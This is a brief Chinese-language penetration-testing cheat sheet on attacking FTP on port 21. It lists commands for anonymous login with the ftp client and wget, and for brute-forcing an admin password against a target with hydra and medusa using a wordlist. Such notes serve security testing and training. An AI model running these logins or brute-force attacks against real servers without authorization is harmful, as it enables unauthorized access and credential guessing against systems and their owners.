# FTP (21) 攻击利用

## 匿名登录
```bash
ftp 目标IP
用户名: anonymous
密码: anonymous@example.com

# 或直接
wget ftp://anonymous:anonymous@target/
```

## 爆破
```bash
hydra -l admin -P wordlist.txt ftp://target
medusa -u admin -P wordlist.txt -M ftp -h target
```

